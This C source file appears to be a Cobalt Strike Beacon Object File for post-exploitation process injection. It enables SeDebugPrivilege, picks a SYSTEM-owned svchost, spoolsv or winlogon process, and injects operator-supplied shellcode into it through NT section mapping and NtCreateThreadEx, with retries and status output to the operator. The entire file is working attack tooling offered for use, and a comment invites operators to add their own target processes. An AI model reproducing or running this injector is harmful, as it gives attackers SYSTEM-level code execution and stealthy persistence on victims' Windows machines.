#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, *PCLIENT_ID;
typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, *PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { (p)->Length = sizeof(OBJECT_ATTRIBUTES); (p)->RootDirectory = r; (p)->Attributes = a; (p)->ObjectName = n; (p)->SecurityDescriptor = s; (p)->SecurityQualityOfService = NULL; }
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_PROCESS_IS_TERMINATING ((NTSTATUS)0xC000010A)

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetTickCount(VOID);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, UINT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, PVOID AttributeList);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtClose(HANDLE Handle);
DECLSPEC_IMPORT ULONG    NTAPI  NTDLL$RtlNtStatusToDosError(NTSTATUS Status);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc(UINT uFlags, SIZE_T uBytes);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL hMem);

DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$EqualSid(PSID p1, PSID p2);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$CreateWellKnownSid(WELL_KNOWN_SID_TYPE WellKnownSidType, PSID DomainSid, PSID pSid, DWORD* cbSid);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$CheckTokenMembership(HANDLE TokenHandle, PSID SidToCheck, PBOOL IsMember);

void EnableDebugPriv() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;
    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        if (ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
        KERNEL32$CloseHandle(hToken);
    }
}

BOOL IsAdmin() {
    BOOL bIsAdmin = FALSE;
    BYTE sidBuffer[SECURITY_MAX_SID_SIZE];
    DWORD cbSid = SECURITY_MAX_SID_SIZE;
    if (ADVAPI32$CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, sidBuffer, &cbSid)) {
        ADVAPI32$CheckTokenMembership(NULL, sidBuffer, &bIsAdmin);
    }
    return bIsAdmin;
}

BOOL IsSystemProcess(DWORD pid) {
    HANDLE hProcess = NULL, hToken = NULL;
    PTOKEN_USER pTokenUser = NULL;
    DWORD dwLength = 0;
    BOOL isSystem = FALSE;
    BYTE sidBuffer[SECURITY_MAX_SID_SIZE];
    DWORD cbSid = SECURITY_MAX_SID_SIZE;

    hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return FALSE;

    if (ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength);
        if (dwLength > 0) {
            pTokenUser = (PTOKEN_USER)KERNEL32$LocalAlloc(LPTR, dwLength);
            if (pTokenUser && ADVAPI32$GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength)) {
                if (ADVAPI32$CreateWellKnownSid(WinLocalSystemSid, NULL, sidBuffer, &cbSid)) {
                    if (ADVAPI32$EqualSid(pTokenUser->User.Sid, sidBuffer)) isSystem = TRUE;
                }
            }
            if (pTokenUser) KERNEL32$LocalFree(pTokenUser);
        }
        KERNEL32$CloseHandle(hToken);
    }
    KERNEL32$CloseHandle(hProcess);
    return isSystem;
}

int ms_strcmp(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) { s1++; s2++; }
    return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}

DWORD FindTargetProcess() {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pids[100]; 
    int count = 0;
    
    hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    // List of target processes for injection. You can add your own here.
    const char* target_procs[] = {
        "svchost.exe", 
        "spoolsv.exe", 
        "winlogon.exe", 
        NULL
    };
    if (KERNEL32$Process32First(hSnapshot, &pe32)) {
        do {
            for (int i = 0; target_procs[i] != NULL; i++) {
                if (ms_strcmp(pe32.szExeFile, target_procs[i]) == 0) {
                    if (IsSystemProcess(pe32.th32ProcessID)) {
                        if (count < 100) { 
                            pids[count] = pe32.th32ProcessID; 
                            count++; 
                        }
                    }
                    break;
                }
            }
        } while (KERNEL32$Process32Next(hSnapshot, &pe32));
    }
    KERNEL32$CloseHandle(hSnapshot);
    if (count == 0) return 0;
    return pids[KERNEL32$GetTickCount() % count];
}

SIZE_T AlignToPage(SIZE_T size) { return (size + 0xFFF) & ~0xFFF; }

NTSTATUS InjectShellcode(DWORD procID, PVOID shellcode, SIZE_T shellcodeSize) {
    NTSTATUS status;
    HANDLE hRemoteProcess = NULL, hSection = NULL, hThread = NULL;
    PVOID baseAddrLocal = NULL, baseAddrRemote = NULL;
    CLIENT_ID cid = { (HANDLE)(uintptr_t)procID, 0 };
    OBJECT_ATTRIBUTES objAttr;
    SIZE_T alignedSize = AlignToPage(shellcodeSize);
    LARGE_INTEGER sectionMax = { .QuadPart = (LONGLONG)alignedSize };

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    EnableDebugPriv();

    ACCESS_MASK desiredAccess = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD;
    status = NTDLL$NtOpenProcess(&hRemoteProcess, desiredAccess, &objAttr, &cid);
    if (!NT_SUCCESS(status)) return status;

    status = NTDLL$NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionMax, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (NT_SUCCESS(status)) {
        SIZE_T localViewSize = alignedSize, remoteViewSize = alignedSize;
        status = NTDLL$NtMapViewOfSection(hSection, KERNEL32$GetCurrentProcess(), &baseAddrLocal, 0, 0, NULL, &localViewSize, 2, 0, PAGE_READWRITE);
        if (NT_SUCCESS(status)) {
            status = NTDLL$NtMapViewOfSection(hSection, hRemoteProcess, &baseAddrRemote, 0, 0, NULL, &remoteViewSize, 2, 0, PAGE_EXECUTE_READ);
            if (NT_SUCCESS(status)) {
                for (SIZE_T i = 0; i < shellcodeSize; i++) { ((unsigned char*)baseAddrLocal)[i] = ((unsigned char*)shellcode)[i]; }
                status = NTDLL$NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hRemoteProcess, baseAddrRemote, NULL, FALSE, 0, 0, 0, NULL);
                if (NT_SUCCESS(status)) NTDLL$NtClose(hThread);
            }
            NTDLL$NtUnmapViewOfSection(KERNEL32$GetCurrentProcess(), baseAddrLocal);
        }
        NTDLL$NtClose(hSection);
    }
    NTDLL$NtClose(hRemoteProcess);
    return status;
}

void go(char* args, int len) {
    if (!IsAdmin()) {
        BeaconPrintf(CALLBACK_ERROR, "Insufficient privileges! Admin/SYSTEM integrity required.\n");
        return; 
    }

    datap parser;
    BeaconDataParse(&parser, args, len);
    SIZE_T scSize = 0;
    char* sc = BeaconDataExtract(&parser, (int*)&scSize);
    if (scSize == 0) return;

    for (int retry = 0; retry < 3; retry++) {
        DWORD pid = FindTargetProcess();
        if (pid == 0) break;

        NTSTATUS status = InjectShellcode(pid, sc, scSize);
        if (NT_SUCCESS(status)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Injected into SYSTEM PID %d\n", pid);
            return;
        }

        if (status == STATUS_PROCESS_IS_TERMINATING) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] PID %d is terminating, retrying... (%d/3)\n", pid, retry + 1);
            KERNEL32$Sleep(500);
            continue;
        }
        BeaconPrintf(CALLBACK_ERROR, "Injection failed: 0x%08X\n", status);
        break;
    }
    BeaconPrintf(CALLBACK_ERROR, "No suitable targets found after retries.\n");
}

